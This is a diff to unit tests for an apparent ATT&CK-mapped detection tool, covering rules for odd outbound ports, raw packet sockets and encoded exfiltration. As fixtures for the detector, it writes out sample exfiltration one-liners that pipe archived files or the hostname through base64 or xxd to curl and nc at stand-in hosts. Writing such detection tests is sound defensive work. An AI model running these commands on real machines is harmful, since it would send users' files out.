@@ -452,6 +452,65 @@ class CollectorSeamTests(unittest.TestCase):
         for tid in ("T1674", "T1495", "T1566"):
             self.assertNotIn(tid, attackmap.CONTEXT_ONLY, tid)
 
+    def test_blind_side_rules_are_counted_as_judged_not_as_built(self):
+        held = ("T1571", "T1205", "T1074", "T1080", "T1491", "T1678", "T1497", "T1072", "T1030")
+        counted = ("T1039", "T1119", "T1005", "T1029", "T1132", "T1573", "T1095", "T1499", "T1020")
+        for tid in held + counted:
+            fired, what = attackmap.PROBES[tid][0]()
+            self.assertTrue(fired, f"{tid}: {what}")
+            self.assertTrue(attackmap.PROBES[tid][1], tid)             # a feeding collector is named
+        for tid in held:
+            self.assertIn(tid, attackmap.CONTEXT_ONLY, tid)
+            self.assertGreater(len(attackmap.HELD[tid]), 20, tid)      # with a reason a person can read
+        for tid in counted:
+            self.assertNotIn(tid, attackmap.CONTEXT_ONLY, tid)
+
+    def test_unusual_port_judges_the_program_the_address_and_the_port(self):
+        ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+        self.assertTrue(techniques.odd_port(ps, "8.8.4.4", "4444", True))
+        self.assertTrue(techniques.odd_port(ps, "8.8.4.4", 4444, None))            # direction unknown still counts
+        for image, dest, port, initiated in (
+                (ps, "8.8.4.4", "443", True),                                       # a web port
+                (ps, "8.8.4.4", "22", True),                                        # git over ssh
+                (ps, "192.168.1.20", "4444", True), (ps, "127.0.0.1", "4444", True),
+                (ps, "fe80::1", "4444", True),
+                (ps, "8.8.4.4", "4444", False), (ps, "8.8.4.4", "4444", "false"),   # inbound
+                (r"C:\Program Files\App\app.exe", "8.8.4.4", "4444", True),        # an ordinary program
+                (ps, "", "4444", True), (ps, "not-an-address", "4444", True),
+                (ps, "8.8.4.4", "", True), (ps, "8.8.4.4", None, True), ("", "8.8.4.4", "4444", True)):
+            self.assertFalse(techniques.odd_port(image, dest, port, initiated), (image, dest, port, initiated))
+        out = tagged(sysmon.audit(events=[
+            {"id": 3, "image": ps, "dest": "8.8.4.4", "dport": str(port), "initiated": True, "time": WHEN}
+            for port in (4444, 4445, 4444)]))
+        self.assertEqual([(f["severity"], f["techniques"]) for f in out], [("medium", ["T1571"])])   # one finding per program
+        self.assertIn("8.8.4.4:4444", out[0]["detail"])
+
+    def test_raw_socket_rule_runs_on_given_data_and_reads_the_machine_otherwise(self):
+        import importlib
+        sniffing = importlib.import_module("jarvis.collectors.network.sniffing")
+        with mock.patch.object(sniffing, "_capture_procs_linux") as tools, \
+                mock.patch.object(sniffing, "_packet_sockets") as sockets, \
+                mock.patch.object(sniffing, "_promisc_ifaces") as promisc:
+            out = sniffing._linux(tools=[], sockets=[("9", "kworker"), ("7", "NetworkManager")], promisc=[])
+            for reader in (tools, sockets, promisc):
+                reader.assert_not_called()                 # a probe never reads this machine
+            self.assertEqual([f["title"] for f in out], ["kworker (pid 9) is holding a raw packet socket"])
+            tools.return_value, sockets.return_value, promisc.return_value = [], [("5", "implant")], []
+            live = sniffing._linux()                       # the real path still reads all three
+            for reader in (tools, sockets, promisc):
+                reader.assert_called_once()
+            self.assertEqual([f["severity"] for f in live], ["high"])
+
+    def test_a_search_pattern_or_a_decode_is_not_data_being_sent_out(self):
+        for cmd, fires in (
+                ("bash -c 'tar cz /home/u/docs | base64 -w0 | curl -d @- https://x.example/p'", True),
+                ("bash -c 'cat /etc/hostname | xxd -p | nc 198.51.100.7 9000'", True),
+                ("bash -c 'grep -n \"base64\\|ncat\\|socat\" rules.py | head'", False),
+                ("bash -c 'curl -s https://x.example/k.b64 | base64 -d > k.bin'", False),
+                ("bash -c 'echo hi | base64 | tee out.b64 | wc -c'", False)):
+            out = tagged(attackmap._replay(techniques.LINUX, [("/usr/bin/bash", cmd)]))
+            self.assertEqual(any("T1132" in f["techniques"] for f in out), fires, cmd)
+
     def test_a_technique_proven_two_ways_regresses_when_either_fails(self):
         self.assertIn("T1543", attackmap.HAND_PROBES)
         self.assertTrue(attackmap.PROBES["T1543"][0]()[0])
@@ -496,27 +555,33 @@ class CollectorSeamTests(unittest.TestCase):
         from jarvis.intel import gaps
         self.assertNotIn("T1562", gaps.COVERAGE)                 # never mapped by itself
         self.assertIn("T1685", gaps._successors("T1562"))
-        self.assertIsNone(gaps._successors("T1497"))
+        self.assertIsNone(gaps._successors("T1480"))
         with tempfile.TemporaryDirectory() as tmp:
             store = Store(os.path.join(tmp, "g.db"))
             try:
-                for tid in ("T1562.001", "T1497.001"):
+                for tid in ("T1562.001", "T1480.001"):
                     store.db.execute(
                         """INSERT INTO indicators(kind,value,norm,confidence,topic,context,malware,
                                                   source_url,first_seen,last_seen,source,doc_count,status)
                            VALUES('attack',?,?,'high','','','','',0,0,'exa',3,'active')""", (tid, tid))
                 store.db.execute("INSERT INTO attack_techniques(tid,name,tactics,platforms,updated) "
-                                 "VALUES('T1497','Sandbox Evasion','stealth','Windows',1)")
+                                 "VALUES('T1480','Execution Guardrails','stealth','Windows',1)")
                 store.commit()
                 findings, covered, _ = gaps.gaps(store)
             finally:
                 store.close()
         self.assertIn("T1562.001", [c[0] for c in covered])
-        self.assertEqual([f["title"].split()[0] for f in findings], ["T1497.001"])
+        self.assertEqual([f["title"].split()[0] for f in findings], ["T1480.001"])
 
-    def test_claims_no_detector_backs_are_gone(self):
+    def test_a_claim_exists_only_where_a_detector_backs_it(self):
         from jarvis.intel import gaps
+        # T1497 and T1571 were once mapped with nothing behind them and were removed.
+        # They are mapped again now that a rule exists, and stay held at claimed.
         for tid in ("T1497", "T1571"):
+            self.assertIn(tid, gaps.COVERAGE)
+            self.assertTrue(attackmap.PROBES[tid][0]()[0], tid)
+            self.assertIn(tid, attackmap.CONTEXT_ONLY)
+        for tid in ("T1480", "T1622", "T1041"):                  # nothing looks for these: no claim
             self.assertNotIn(tid, gaps.COVERAGE)
             self.assertNotIn(tid, attackmap.PROBES)
 
